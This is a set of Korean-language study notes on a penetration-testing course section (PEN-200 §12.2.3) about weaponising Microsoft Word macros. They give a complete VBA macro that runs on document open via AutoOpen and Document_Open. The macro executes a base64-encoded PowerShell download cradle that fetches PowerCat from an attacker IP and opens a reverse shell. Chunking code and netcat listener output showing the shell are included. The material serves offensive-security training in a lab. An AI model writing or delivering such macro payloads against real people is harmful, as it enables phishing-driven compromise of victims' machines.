# 12.2.3 Microsoft Word 매크로 이용

> **Leveraging Microsoft Word Macros** · PEN-200 §12.2.3

매크로(macro) = 하나의 작업을 프로그래밍적으로 처리하려고 묶어 둔 명령·지시의 모음. 조직에서 동적 콘텐츠 관리나 외부 콘텐츠 연동에 흔히 씀. VBA(Visual Basic for Applications) 매크로는 **ActiveX 객체와 Windows Script Host 에 완전한 접근권**을 가짐 — HTML 애플리케이션 안의 JavaScript 와 같은 위치임. 이 절의 목표는 문서를 여는 순간 리버스 셸이 뜨는 Word 문서를 만드는 것.

매크로는 가장 오래되고 잘 알려진 클라이언트 사이드 벡터인데도 지금까지 잘 통함 — 앞 절의 고려사항을 반영하고 피해자가 매크로를 켜도록 설득할 수만 있으면 됨.

> **Info** — DDE(Dynamic Data Exchange)·OLE(Object Linking and Embedding) 같은 구형 클라이언트 사이드 벡터는 시스템을 크게 손대지 않는 한 더 이상 안정적으로 동작하지 않음.

**저장 형식이 먼저임.** 문서를 `.doc` 로 저장할 것 — 신형 `.docx` 는 템플릿을 붙이지 않으면 매크로를 저장하지 못함. `.docx` 안에서 매크로를 실행할 수는 있어도 문서에 심어 **지속시키지는 못한다**는 뜻임. `.docm` 도 대안임.

**매크로 저장 위치를 틀리면 문서에 안 실림.** Macros 창의 `Macros in` 드롭다운에서 현재 문서를 골라야 함. 안 고르면 매크로가 문서가 아니라 **전역 템플릿**에 저장됨.

만드는 경로 — 메뉴바 View 탭 → Macros → Macro Name 에 `MyMacro` 입력 → `Macros in` 에서 해당 문서 선택 → Create. VBA 편집기 창이 뜨고 빈 골격이 삽입됨.

```
Sub MyMacro()
'
' MyMacro Macro
'
'
End Sub
```

*Create 직후 삽입되는 빈 매크로 골격 — 작은따옴표 줄은 주석임*

읽어야 할 VBA 문법 —

- `Sub` 로 시작해 `End Sub` 로 끝나는 구간이 매크로 본체임
- sub 프로시저는 함수와 비슷하지만 **값을 반환하지 않아 식(expression) 안에서는 쓸 수 없음**
- 작은따옴표(`'`) 로 시작하는 줄은 한 줄 주석

OS 명령 실행은 ActiveX 객체로 함. `CreateObject` 로 Windows Script Host Shell 객체를 만들고 `Wscript.Shell` 의 `Run` 메서드를 호출하면 대상 클라이언트에서 애플리케이션이 실행됨.

**Office 매크로는 자동 실행되지 않으므로** 미리 정의된 `AutoOpen` 매크로와 `Document_Open` 이벤트를 써서 문서를 열 때 우리 프로시저가 호출되게 함. 둘은 Word 와 문서가 어떤 방식으로 열렸는지에 따라 동작이 갈리고 서로가 못 잡는 경우를 각각 덮으므로 **둘 다** 넣음.

```
Sub AutoOpen()
  MyMacro
End Sub
Sub Document_Open()
  MyMacro
End Sub
Sub MyMacro()
  CreateObject("Wscript.Shell").Run "powershell"
End Sub
```

저장 후 문서를 다시 열면 매크로가 비활성화됐다는 보안 경고가 뜨고, Enable Content 를 눌러야 매크로가 돌아 PowerShell 창이 뜸. 실전에서 이 클릭을 못 받으면 공격은 그대로 실패임. 기업 환경에서 Office 문서 매크로가 전면 금지된 경우도 있으나, 대개는 업무상 흔히 쓰이고 허용돼 있음.

*피해자가 문서를 열었을 때의 매크로 보안 경고 — Enable Content 클릭이 공격 성패를 가름*

여기서 리버스 셸로 확장함. PowerCat 을 내려받아 실행하는 PowerShell 다운로드 크래들을 base64 로 인코딩해 VBA 문자열로 넣는 방식임.

**VBA 는 리터럴 문자열을 255자로 제한함.** base64 인코딩된 명령을 문자열 하나로 못 박는 이유임. 단 **변수에 담긴 문자열에는 이 제한이 없어서**, 여러 줄로 쪼개 변수에 이어 붙이면 우회됨(`Dim Str As String` 으로 선언).

```
Sub AutoOpen()
    MyMacro
End Sub
Sub Document_Open()
    MyMacro
End Sub
Sub MyMacro()
    Dim Str As String
    CreateObject("Wscript.Shell").Run Str
End Sub
```

*문자열 변수를 쓰도록 바꾼 매크로 골격 — `Str` 에 조각을 이어 붙일 자리*

인코딩 전 원본 명령 (교재 지면에서 줄이 접혀 있음 — 그대로 복사해 쓰면 실패하므로 한 줄로 이어 붙일 것) —

```
IEX(New-Object
System.Net.WebClient).DownloadString('http://192.168.119.2/powercat.ps1');powercat -c
192.168.119.2 -p 4444 -e powershell
```

**PowerShell 이 지원하는 base64 의 기본 문자셋은 UTF-16LE 임.** 다른 문자셋으로 인코딩하면 페이로드가 동작하지 않음. Kali 에서는 `pwsh` 로 인코딩함.

인코딩 결과를 50자 단위로 쪼개 매크로에 넣을 형태로 출력하는 스크립트. 붙여넣은 base64 문자열에 줄바꿈이 섞이지 않게 할 것 —

```
str = "powershell.exe -nop -w hidden -e SQBFAFgAKABOAGUAdwA..."
n = 50
for i in range(0, len(str), n):
    print("Str = Str + " + '"' + str[i:i+n] + '"')
```

쪼갠 조각을 넣어 완성한 매크로 —

```
Sub AutoOpen()
    MyMacro
End Sub
Sub Document_Open()
    MyMacro
End Sub
Sub MyMacro()
    Dim Str As String
    Str = Str + "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGU"
        Str = Str + "AdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAd"
        Str = Str + "AAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwB"
    ...
        Str = Str + "QBjACAAMQA5ADIALgAxADYAOAAuADEAMQA4AC4AMgAgAC0AcAA"
        Str = Str + "gADQANAA0ADQAIAAtAGUAIABwAG8AdwBlAHIAcwBoAGUAbABsA"
        Str = Str + "A== "
    CreateObject("Wscript.Shell").Run Str
End Sub
```

실행 준비 — PowerCat 스크립트가 있는 디렉터리에서 Python3 웹 서버를 띄우고, 4444 포트로 Netcat 리스너를 열어 둠. 문서를 더블클릭하면 매크로가 자동 실행되고, 웹 서버에는 PowerCat 스크립트 GET 요청이, 리스너에는 리버스 셸이 들어옴.

```
kali@kali:~$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [192.168.119.2] from (UNKNOWN) [192.168.50.196] 49768
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.
Install the latest PowerShell for new features and improvements!
https://aka.ms/PSWindows
PS C:\Users\offsec\Documents>
```

*4444 리스너에 들어온 PowerShell 리버스 셸*

이때 **Enable Content 경고가 다시 뜨지 않음** — 한 번 허용한 문서는 파일 이름이 바뀌어야만 경고가 재출현함. 테스트 중 착각하기 쉬운 지점임.

정리하면 흐름은 둘로 나뉨. 먼저 문서를 열 때 명령 하나를 실행하는 VBA 매크로를 만들고, 그 명령을 PowerCat 을 내려받아 리버스 셸을 띄우는 base64 인코딩 PowerShell 명령으로 바꿔 끼운 것임. 다만 사용자 인식 향상과 보안 기술 증가로 매크로를 전달·실행시키기가 계속 어려워지고 있어, 대안이자 악성 Office 문서의 전달 수단으로도 쓸 수 있는 다음 벡터가 이어짐.
